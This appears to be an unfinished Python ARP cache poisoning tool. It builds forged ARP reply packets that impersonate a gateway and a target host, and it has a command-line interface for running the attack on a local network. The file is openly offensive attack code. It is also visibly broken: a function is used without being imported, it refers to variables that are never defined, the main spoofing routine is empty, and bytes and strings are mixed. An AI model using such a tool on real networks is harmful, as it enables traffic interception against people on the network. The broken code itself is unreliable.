#!/usr/bin/env python3
# https://github.com/EONRaider/Arp-Spoofer

__author__ = 'EONRaider @ keybase.io/eonraider'

"""
A low-level ARP Cache Poisoning (a.k.a "ARP Spoofing") tool.
"""

import argparse
import re
import socket


class ARPPacket(object):
    ETHER_T = b'\x08\x06'  # Ethertype code of ARP per RFC 7042

    def __init__(self, attacker_mac: str, gateway_mac: str, target_mac: str,
                 gateway_ip: str, target_ip: str):
        self.gateway_ip = inet_aton(gateway_ip)
        self.target_ip = inet_aton(target_ip)
        self.arp_header = None
        self.gateway_arp_packet = None
        self.target_arp_packet = None
        self.attacker_mac = self._mac_to_hex(attacker_mac)
        self.gateway_mac = self._mac_to_hex(gateway_mac)
        self.target_mac = self._mac_to_hex(target_mac)
        self.gateway_eth_header = self.gateway_mac + self.attacker_mac + \
                                  self.ETHER_T
        self.target_eth_header = self.target_mac + self.attacker_mac + \
                                 self.ETHER_T

    @property
    def arp_header(self):
        """
        Gets a byte-string representation of the ARP header of a packet.
        Sets the ARP header of a packet as defined by RFC 826.
        """
        return self._arp_header

    @arp_header.setter
    def arp_header(self, fields):
        if fields is None:                  # ARP header field structure
            hardware_address = b'\x00\x01'  # '\x00\x01' = Ethernet
            protocol_address = b'\x08\x00'  # '\x08\x00' = IP
            hardware_address_len = b'\x06'
            protocol_address_len = b'\x04'
            opcode = b'\x00\x02'            # '\x00\x02' = REPLY
            arp_header = b''.join((hardware_address, protocol_address,
                                   hardware_address_len, protocol_address_len,
                                   opcode))
        else:
            arp_header = b''.join(*fields)
        self._arp_header = arp_header

    @staticmethod
    def _mac_to_hex(mac_addr: str) -> str:
        """
        Transform a MAC address string from IEEE 802 standard to a
        sequence of hexadecimal bytes.
        Ex: 'AB:BC:CD:12:23:34' to '\xAB\xBC\xCD\x12\x23\x34'.
        """
        return re.sub(r'^|[:-]', r'\\x', mac_addr)

    def get_packets(self) -> tuple:
        self.gateway_arp_packet = r''.join((self.gateway_eth_header,
                                            self.arp_header,
                                            self.attacker_mac,
                                            self.victim_ip,
                                            self.gateway_mac,
                                            self.gateway_ip))
        self.victim_arp_packet = r''.join((self.victim_eth_header,
                                           self.arp_header,
                                           self.attacker_mac,
                                           self.gateway_ip,
                                           self.victim_mac,
                                           self.victim_ip))
        return self.gateway_arp_packet, self.victim_arp_packet


class Spoofer(object):
    def __init__(self):
        pass

    def execute(self):
        pass


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='Execute ARP Cache Poisoning attacks (a.k.a "ARP '
                    'Spoofing") on local networks.')
    parser.add_argument('interface', type=str,
                        help='Interface on the attacker machine to '
                             'send/receive packets from.')
    parser.add_argument('--attackermac', type=str, required=True, metavar='MAC',
                        help='MAC address of the Network Interface Controller '
                             '(NIC) used by the attacker.')
    parser.add_argument('--gatemac', type=str, required=True, metavar='MAC',
                        help='MAC address of the NIC associated to the '
                             'gateway.')
    parser.add_argument('--targetmac', type=str, required=True, metavar='MAC',
                        help='MAC address of the NIC associated to the target.')
    parser.add_argument('--gateip', type=str, required=True, metavar='IP',
                        help='IP address currently assigned to the gateway.')
    parser.add_argument('--targetip', type=str, required=True, metavar='IP',
                        help='IP address currently assigned to the target.')
    cli_args = parser.parse_args()
    spoof(cli_args)
